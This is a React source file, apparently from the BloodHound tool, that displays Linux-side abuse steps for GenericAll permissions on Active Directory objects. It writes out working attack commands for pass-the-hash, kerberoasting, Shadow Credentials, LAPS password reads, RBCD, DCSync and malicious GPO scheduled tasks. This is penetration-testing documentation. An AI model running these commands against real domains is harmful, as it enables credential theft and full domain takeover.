// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Link, Typography } from '@mui/material';
import { FC } from 'react';
import { EdgeInfoProps } from '../index';

const LinuxAbuse: FC<EdgeInfoProps & { targetId: string; haslaps: boolean }> = ({
    sourceName,
    targetName,
    targetType,
    haslaps,
}) => {
    switch (targetType) {
        case 'Group':
            return (
                <>
                    <Typography variant='body2'>
                        Full control of a group allows you to directly modify group membership of the group.
                    </Typography>

                    <Typography variant='body2'>
                        Use samba's net tool to add the user to the target group. The credentials can be supplied in
                        cleartext or prompted interactively if omitted from the command line:
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        It can also be done with pass-the-hash using{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://github.com/byt3bl33d3r/pth-toolkit'>
                            pth-toolkit's net tool
                        </Link>
                        . If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        Finally, verify that the user was successfully added to the group:
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                        }
                    </Typography>
                </>
            );
        case 'User':
            return (
                <>
                    <Typography variant='body2'>
                        Full control of a user allows you to modify properties of the user to perform a targeted
                        kerberoast attack, and also grants the ability to reset the password of the user without knowing
                        their current one.
                    </Typography>

                    <Typography variant='body1'> Targeted Kerberoast </Typography>

                    <Typography variant='body2'>
                        A targeted kerberoast attack can be performed using{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://github.com/ShutdownRepo/targetedKerberoast'>
                            targetedKerberoast.py
                        </Link>
                        .
                    </Typography>

                    <Typography component={'pre'}>
                        {"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}
                    </Typography>

                    <Typography variant='body2'>
                        The tool will automatically attempt a targetedKerberoast attack, either on all users or against
                        a specific one if specified in the command line, and then obtain a crackable hash. The cleanup
                        is done automatically as well.
                    </Typography>

                    <Typography variant='body2'>
                        The recovered hash can be cracked offline using the tool of your choice.
                    </Typography>

                    <Typography variant='body1'> Force Change Password </Typography>

                    <Typography variant='body2'>
                        Use samba's net tool to change the user's password. The credentials can be supplied in cleartext
                        or prompted interactively if omitted from the command line. The new password will be prompted if
                        omitted from the command line.
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        It can also be done with pass-the-hash using{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://github.com/byt3bl33d3r/pth-toolkit'>
                            pth-toolkit's net tool
                        </Link>
                        . If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'
                        }
                    </Typography>
                    <Typography variant='body2'>
                        Now that you know the target user's plain text password, you can either start a new agent as
                        that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions,
                        or perhaps even RDP to a system the target user has access to. For more ideas and information,
                        see the references tab.
                    </Typography>

                    <Typography variant='body1'> Shadow Credentials attack </Typography>

                    <Typography variant='body2'>
                        To abuse this permission, use{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://github.com/ShutdownRepo/pywhisker'>
                            pyWhisker
                        </Link>
                        .
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        For other optional parameters, view the pyWhisker documentation.
                    </Typography>
                </>
            );
        case 'Computer':
            if (haslaps) {
                return (
                    <>
                        <Typography variant='body1'> Retrieve LAPS Password </Typography>
                        <Typography variant='body2'>
                            Full control of a computer object is abusable when the computer's local admin account
                            credential is controlled with LAPS.
                        </Typography>
                        <Typography variant='body2'>
                            For systems using legacy LAPS, the following AD computer object properties are relevant:
                            <br />
                            <b>- ms-Mcs-AdmPwd</b>: The plaintext LAPS password
                            <br />
                            <b>- ms-Mcs-AdmPwdExpirationTime</b>: The LAPS password expiration time
                            <br />
                        </Typography>
                        <Typography variant='body2'>
                            For systems using Windows LAPS (2023 edition), the following AD computer object properties
                            are relevant:
                            <br />
                            <b>- msLAPS-Password</b>: The plaintext LAPS password
                            <br />
                            <b>- msLAPS-PasswordExpirationTime</b>: The LAPS password expiration time
                            <br />
                            <b>- msLAPS-EncryptedPassword</b>: The encrypted LAPS password
                            <br />
                            <b>- msLAPS-EncryptedPasswordHistory</b>: The encrypted LAPS password history
                            <br />
                            <b>- msLAPS-EncryptedDSRMPassword</b>: The encrypted Directory Services Restore Mode (DSRM)
                            password
                            <br />
                            <b>- msLAPS-EncryptedDSRMPasswordHistory</b>: The encrypted DSRM password history
                            <br />
                        </Typography>
                        <Typography variant='body2'>
                            Plaintext attributes can be read using a simple LDAP client. For example, with bloodyAD:
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime"
                            }
                        </Typography>
                        <Typography variant='body2'>
                            See Windows abuse for retrieving and decrypting the encrypted attributes.
                        </Typography>
                        <Typography variant='body1'> Resource-Based Constrained Delegation </Typography>
                        First, if an attacker does not control an account with an SPN set, a new attacker-controlled
                        computer account can be added with Impacket's addcomputer.py example script:
                        <Typography component={'pre'}>
                            {
                                "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"
                            }
                        </Typography>
                        We now need to configure the target object so that the attacker-controlled computer can delegate
                        to it. Impacket's rbcd.py script can be used for that purpose:
                        <Typography component={'pre'}>
                            {
                                "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"
                            }
                        </Typography>
                        And finally we can get a service ticket for the service name (sname) we want to "pretend" to be
                        "admin" for. Impacket's getST.py example script can be used for that purpose.
                        <Typography component={'pre'}>
                            {
                                "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
                            }
                        </Typography>
                        This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of
                        the TARGETCOMPUTER.
                        <Typography variant='body1'> Resource-Based Constrained Delegation </Typography>
                        <Typography variant='body2'>
                            First, if an attacker does not control an account with an SPN set, a new attacker-controlled
                            computer account can be added with Impacket's addcomputer.py example script:
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"
                            }
                        </Typography>
                        <Typography variant='body2'>
                            We now need to configure the target object so that the attacker-controlled computer can
                            delegate to it. Impacket's rbcd.py script can be used for that purpose:
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"
                            }
                        </Typography>
                        <Typography variant='body2'>
                            And finally we can get a service ticket for the service name (sname) we want to "pretend" to
                            be "admin" for. Impacket's getST.py example script can be used for that purpose.
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
                            }
                        </Typography>
                        <Typography variant='body2'>
                            This ticket can then be used with Pass-the-Ticket, and could grant access to the file system
                            of the TARGETCOMPUTER.
                        </Typography>
                        <Typography variant='body1'> Shadow Credentials attack </Typography>
                        <Typography variant='body2'>
                            To abuse this permission, use{' '}
                            <Link
                                target='_blank'
                                rel='noopener noreferrer'
                                href='https://github.com/ShutdownRepo/pywhisker'>
                                pyWhisker
                            </Link>
                            .
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'
                            }
                        </Typography>
                        <Typography variant='body2'>
                            For other optional parameters, view the pyWhisker documentation.
                        </Typography>
                    </>
                );
            } else {
                return (
                    <>
                        <Typography variant='body1'> Resource-Based Constrained Delegation </Typography>
                        <Typography variant='body2'>
                            First, if an attacker does not control an account with an SPN set, a new attacker-controlled
                            computer account can be added with Impacket's addcomputer.py example script:
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"
                            }
                        </Typography>
                        <Typography variant='body2'>
                            We now need to configure the target object so that the attacker-controlled computer can
                            delegate to it. Impacket's rbcd.py script can be used for that purpose:
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"
                            }
                        </Typography>
                        <Typography variant='body2'>
                            And finally we can get a service ticket for the service name (sname) we want to "pretend" to
                            be "admin" for. Impacket's getST.py example script can be used for that purpose.
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
                            }
                        </Typography>
                        <Typography variant='body2'>
                            This ticket can then be used with Pass-the-Ticket, and could grant access to the file system
                            of the TARGETCOMPUTER.
                        </Typography>
                        <Typography variant='body1'> Shadow Credentials attack </Typography>
                        <Typography variant='body2'>
                            To abuse this permission, use{' '}
                            <Link
                                target='_blank'
                                rel='noopener noreferrer'
                                href='https://github.com/ShutdownRepo/pywhisker'>
                                pyWhisker
                            </Link>
                            .
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'
                            }
                        </Typography>
                        <Typography variant='body2'>
                            For other optional parameters, view the pyWhisker documentation.
                        </Typography>
                    </>
                );
            }
        case 'Domain':
            return (
                <>
                    <Typography variant='body1'> DCSync </Typography>

                    <Typography variant='body2'>
                        The AllExtendedRights permission grants {sourceName} both the DS-Replication-Get-Changes and
                        DS-Replication-Get-Changes-All permission, which combined allow a principal to replicate objects
                        from the domain {targetName}.
                    </Typography>

                    <Typography variant='body2'>
                        This can be abused using Impacket's secretsdump.py example script:
                    </Typography>

                    <Typography component={'pre'}>
                        {"secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'"}
                    </Typography>

                    <Typography variant='body1'>Generic Descendent Object Takeover</Typography>
                    <Typography variant='body2'>
                        The simplest and most straight forward way to obtain control of the objects of the domain is to
                        apply a GenericAll ACE on the domain that will inherit down to all object types. This can be
                        done using Impacket's dacledit (cf. "grant rights" reference for the link).
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            "dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'DomainDistinguishedName' 'domain'/'user':'password'"
                        }
                    </Typography>

                    <Typography variant='body2'>
                        Now, the "JKOHLER" user will have full control of all descendent objects of each type.
                    </Typography>

                    <Typography variant='body1'>Objects for which ACL inheritance is disabled</Typography>

                    <Typography variant='body2'>
                        The compromise vector described above relies on ACL inheritance and will not work for objects
                        with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute
                        adminCount=1). This observation applies to any user or computer with inheritance disabled,
                        including objects located in nested OUs.
                    </Typography>

                    <Typography variant='body2'>
                        In such a situation, it may still be possible to exploit GenericAll permissions on a domain  
                        object. Indeed, with GenericAll permissions over a domain object, it is possible to modify its 
                        gPLink attribute. This may be abused to apply a malicious Group Policy Object
                        (GPO) to all of the domain's user and computer objects (including the ones located in nested OUs).
                        This can be exploited to make said child objects execute arbitrary commands e.g. through an immediate
                        scheduled task, thus compromising them.
                    </Typography>

                    <Typography variant='body2'>
                        If you do not have control over an existing GPO (or the ability to create new ones), successful exploitation
                        will require the possibility to add non-existing DNS records to the domain and to create machine accounts. 
                        Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the 
                        attack vector implementation is not trivial and will require some setup.
                    </Typography>

                    <Typography variant='body2'>
                        From a Linux machine, the gPLink manipulation attack vector may be exploited using the{' '}
                        <Link target='_blank' rel='noopener noreferrer' href='https://github.com/synacktiv/OUned'>
                            OUned.py
                        </Link>{' '}
                        tool. For a detailed outline of exploit requirements and implementation, you can refer to{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory'>
                            the article associated to the OUned.py tool
                        </Link>
                        .
                    </Typography>
                    <Typography variant='body2'>
                        If you have control over an existing GPO (or the ability to create new ones), the attack is simpler. You can inject a malicious
                        configuration (e.g. an immediate scheduled task) into a controlled GPO, and then link the GPO to the target domain object through its gPLink attribute.
                        To do so, you can use the <Link target='_blank' rel='noopener noreferrer' href='https://github.com/synacktiv/GroupPolicyBackdoor'>
                            GroupPolicyBackdoor.py
                        </Link>{' '}
                        tool. You may for instance first inject the malicious configuration with the 'inject' command.
                    </Typography>
                    <Typography component={'pre'}>
                            {
                                'python3 gpb.py gpo inject -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -m Scheduled_task_add.ini -n "TARGETGPO"'
                            }
                    </Typography>
                    <Typography variant='body2'>
                        You can then link the modified GPO to the domain, through the 'link' command.
                    </Typography>
                    <Typography component={'pre'}>
                            {
                                'python3 gpb.py links link -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -o "DC=corp,DC=com" -n "TARGETGPO"'
                            }
                    </Typography>

                    <Typography variant='body2'>
                        Be mindful of the number of users and computers that are in the given OU as they all will
                        attempt to fetch and apply the malicious GPO.
                    </Typography>
                </>
            );
        case 'GPO':
            return (
                <>
                    <Typography variant='body2'>
                        With full control over a GPO, you may make modifications to that GPO in order to inject malicious configurations into it. 
                        You could for instance add a Scheduled Task that will then be executed by all of the computers and/or users to which the GPO applies, 
                        thus compromising them. Note that some configurations (such as Scheduled Tasks) implement item-level targeting, allowing 
                        to precisely target a specific object.
                        GPOs are applied every 90 minutes for standard objects (with a random offset of 0 to 30 minutes), and every 5 minutes for domain controllers.
                        See the references tab for a more detailed write up on this abuse.
                    </Typography>

                    <Typography variant='body2'>
                        The <Link target='_blank' rel='noopener noreferrer' href='https://github.com/synacktiv/GroupPolicyBackdoor'>
                            GroupPolicyBackdoor.py
                        </Link>{' '}
                        tool can be used to perform the attack from a Linux machine. First, define a module file that describes the configuration to inject. 
                        The following one defines a computer configuration, with an immediate Scheduled Task adding a domain user as local administrator. 
                        A filter is defined, so that it only applies to a specific target.
                    </Typography>

                    <Typography component={'pre'}>
                            {
                                '[MODULECONFIG]\n' +
                                'name = Scheduled Tasks\n' +
                                'type = computer\n' +
                                '\n' +
                                '[MODULEOPTIONS]\n' +
                                'task_type = immediate\n' +
                                'program = cmd.exe\n' +
                                'arguments = /c "net localgroup Administrators corp.com\john /add"\n' +
                                '\n' +
                                '[MODULEFILTERS]\n' +
                                'filters = [{ "operator": "AND", "type": "Computer Name", "value": "srv1.corp.com"}]'
                            }
                    </Typography>

                     <Typography variant='body2'>
                        Place the described configuration into the Scheduled_task_add.ini file, and inject it into the target GPO with the 'inject' command.
                    </Typography>
                    <Typography component={'pre'}>
                            {
                                'python3 gpb.py gpo inject -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -m Scheduled_task_add.ini -n "TARGETGPO"'
                            }
                     </Typography>

                    <Typography variant='body2'>
                        Alternatively, <Link target='_blank' rel='noopener noreferrer' href='https://github.com/Hackndo/pyGPOAbuse'>
                             pyGPOAbuse.py 
                        </Link>{' '}
                         can be used for that purpose.
                    </Typography>
                </>
            );
        case 'OU':
            return (
                <>
                    <Typography variant='body1'>Control of the Organization Unit</Typography>

                    <Typography variant='body2'>
                        With full control of the OU, you may add a new ACE on the OU that will inherit down to the
                        objects under that OU. Below are two options depending on how targeted you choose to be in this
                        step:
                    </Typography>

                    <Typography variant='body1'>Generic Descendent Object Takeover</Typography>
                    <Typography variant='body2'>
                        The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll
                        ACE on the OU that will inherit down to all object types. This can be done using Impacket's
                        dacledit (cf. "grant rights" reference for the link).
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            "dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'domain'/'user':'password'"
                        }
                    </Typography>

                    <Typography variant='body2'>
                        Now, the "JKOHLER" user will have full control of all descendent objects of each type.
                    </Typography>

                    <Typography variant='body1'>Targeted Descendent Object Takeoever</Typography>

                    <Typography variant='body2'>
                        If you want to be more targeted with your approach, it is possible to specify precisely what
                        right you want to apply to precisely which kinds of descendent objects. Refer to the Windows
                        Abuse info for this.
                    </Typography>

                    <Typography variant='body1'>Objects for which ACL inheritance is disabled</Typography>

                    <Typography variant='body2'>
                        The compromise vector described above relies on ACL inheritance and will not work for objects
                        with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute
                        adminCount=1). This observation applies to any user or computer with inheritance disabled,
                        including objects located in nested OUs.
                    </Typography>

                    <Typography variant='body2'>
                        In such a situation, it may still be possible to exploit GenericAll permissions on an OU 
                        object. Indeed, with GenericAll permissions over an OU, it is possible to modify its 
                        gPLink attribute. This may be abused to apply a malicious Group Policy Object
                        (GPO) to all of the OU's user and computer objects (including the ones located in nested OUs).
                        This can be exploited to make said child objects execute arbitrary commands e.g. through an immediate
                        scheduled task, thus compromising them.
                    </Typography>

                    <Typography variant='body2'>
                        If you do not have control over an existing GPO (or the ability to create new ones), successful exploitation
                        will require the possibility to add non-existing DNS records to the domain and to create machine accounts. 
                        Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the 
                        attack vector implementation is not trivial and will require some setup.
                    </Typography>

                    <Typography variant='body2'>
                        From a Linux machine, the gPLink manipulation attack vector may be exploited using the{' '}
                        <Link target='_blank' rel='noopener noreferrer' href='https://github.com/synacktiv/OUned'>
                            OUned.py
                        </Link>{' '}
                        tool. For a detailed outline of exploit requirements and implementation, you can refer to{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory'>
                            the article associated to the OUned.py tool
                        </Link>
                        .
                    </Typography>
                    <Typography variant='body2'>
                        If you have control over an existing GPO (or the ability to create new ones), the attack is simpler. You can inject a malicious
                        configuration (e.g. an immediate scheduled task) into a controlled GPO, and then link the GPO to the target OU through its gPLink attribute.
                        To do so, you can use the <Link target='_blank' rel='noopener noreferrer' href='https://github.com/synacktiv/GroupPolicyBackdoor'>
                            GroupPolicyBackdoor.py
                        </Link>{' '}
                        tool. You may for instance first inject the malicious configuration with the 'inject' command.
                    </Typography>
                    <Typography component={'pre'}>
                            {
                                'python3 gpb.py gpo inject -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -m Scheduled_task_add.ini -n "TARGETGPO"'
                            }
                    </Typography>
                    <Typography variant='body2'>
                        You can then link the modified GPO to the OU, through the 'link' command.
                    </Typography>
                    <Typography component={'pre'}>
                            {
                                'python3 gpb.py links link -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -o "OU=SERVERS,DC=corp,DC=com" -n "TARGETGPO"'
                            }
                    </Typography>

                    <Typography variant='body2'>
                        Be mindful of the number of users and computers that are in the given OU as they all will
                        attempt to fetch and apply the malicious GPO.
                    </Typography>
                </>
            );
        case 'Container':
            return (
                <>
                    <Typography variant='body1'>Control of the Container</Typography>

                    <Typography variant='body2'>
                        With full control of the container, you may add a new ACE on the container that will inherit
                        down to the objects under that OU. Below are two options depending on how targeted you choose to
                        be in this step:
                    </Typography>

                    <Typography variant='body1'>Generic Descendent Object Takeover</Typography>
                    <Typography variant='body2'>
                        The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll
                        ACE on the OU that will inherit down to all object types. This can be done using Impacket's
                        dacledit (cf. "grant rights" reference for the link).
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            "dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'containerDistinguishedName' 'domain'/'user':'password'"
                        }
                    </Typography>

                    <Typography variant='body2'>
                        Now, the "JKOHLER" user will have full control of all descendent objects of each type.
                    </Typography>

                    <Typography variant='body1'>Targeted Descendent Object Takeoever</Typography>

                    <Typography variant='body2'>
                        If you want to be more targeted with your approach, it is possible to specify precisely what
                        right you want to apply to precisely which kinds of descendent objects. Refer to the Windows
                        Abuse info for this.
                    </Typography>
                </>
            );
        case 'CertTemplate':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericAll permission over a certificate template, you may be able to perform an ESC4
                        attack by modifying the template's attributes. BloodHound will in that case create an ADCSESC4
                        edge from the principal to the forest domain node.
                    </Typography>
                </>
            );
        case 'EnterpriseCA':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericAll permission over an enterprise CA, you can publish certificate templates to the
                        enterprise CA by adding the CN name of the template in the enterprise CA object's
                        certificateTemplates attribute. This action may enable you to perform an ADCS domain escalation.
                    </Typography>
                </>
            );
        case 'RootCA':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericAll permission over a root CA, you can make a rogue certificate trusted as a root CA
                        in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This
                        action may enable you to perform an ADCS domain escalation.
                    </Typography>
                </>
            );
        case 'NTAuthStore':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericAll permission over a NTAuth store, you can make an enterprise CA certificate
                        trusted for NT (domain) authentication in the AD forest by adding the certificate in the root CA
                        object's cACertificate attribute. This action may enable you to perform an ADCS domain
                        escalation.
                    </Typography>
                </>
            );
        case 'IssuancePolicy':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericAll permission over an issuance policy object, you create a OID group link to a
                        targeted group by adding the group's distinguishedName in the msDS-OIDToGroupLink attribute of
                        the issuance policy object. This action may enable you to gain membership of the group through
                        an ADCS ESC13 attack.
                    </Typography>
                </>
            );
        case 'Site':
            return (
                <>
                    <Typography variant='body2'>
                        GenericAll permissions over a Site object allow modifying the gPLink attribute of the site.
                        The ability to alter the gPLink attribute of a site may allow an attacker to apply a malicious Group Policy Object
                        (GPO) to all of the objects associated with the site. This can be exploited to make said objects execute 
                        arbitrary commands e.g. through an immediate scheduled task, thus compromising them.
                        In the case of a site, the affected objects are the computers that have an IP address included in one of the site's subnets  
                        (or computers that do not belong to any site if this is the default site), as well as users connecting to these computers.
                        Note that Server objects associated with the Site should be located in the Site.
                    </Typography>

                    <Typography variant='body2'>
                        If you do not have control over an existing GPO (or the ability to create new ones), successful exploitation
                        will require the possibility to add non-existing DNS records to the
                        domain and to create machine accounts. Alternatively, an already compromised domain-joined
                        machine may be used to perform the attack. Note that the attack vector implementation is not
                        trivial and will require some setup.
                    </Typography>

                    <Typography variant='body2'>
                        From a Linux machine, the gPLink manipulation attack vector may be exploited using the{' '}
                        <Link target='_blank' rel='noopener noreferrer' href='https://github.com/synacktiv/OUned'>
                            OUned.py
                        </Link>{' '}
                        tool. For a detailed outline of exploit requirements and implementation, you can refer to{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory'>
                            the article associated to the OUned.py tool
                        </Link>
                        .
                    </Typography>

                    <Typography variant='body2'>
                        If you have control over an existing GPO (or the ability to create new ones), the attack is simpler. You can inject a malicious
                        configuration (e.g. an immediate scheduled task) in that GPO, and then link the GPO to the target Site through its gPLink attribute.
                        To do so, you can use the <Link target='_blank' rel='noopener noreferrer' href='https://github.com/synacktiv/GroupPolicyBackdoor'>
                            GroupPolicyBackdoor.py
                        </Link>{' '}
                        tool. You may for instance first inject the malicious configuration with the 'inject' command.
                    </Typography>
                    <Typography component={'pre'}>
                            {
                                'python3 gpb.py gpo inject -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -m Scheduled_task_add.ini -n "TARGETGPO"'
                            }
                    </Typography>
                    <Typography variant='body2'>
                        Now you can link the modified GPO to the Site object, through the 'link' command.
                    </Typography>
                    <Typography component={'pre'}>
                            {
                                'python3 gpb.py links link -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -o "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=com" -n "TARGETGPO"'
                            }
                    </Typography>

                    <Typography variant='body2'>
                        Be mindful of the number of users and computers that are in the given site as they all will
                        attempt to fetch and apply the malicious GPO.
                    </Typography>
                </>
            );

        default:
            return (
                <>
                    <Typography variant='body2'>No abuse information available for this node type.</Typography>
                </>
            );
    }
};

export default LinuxAbuse;
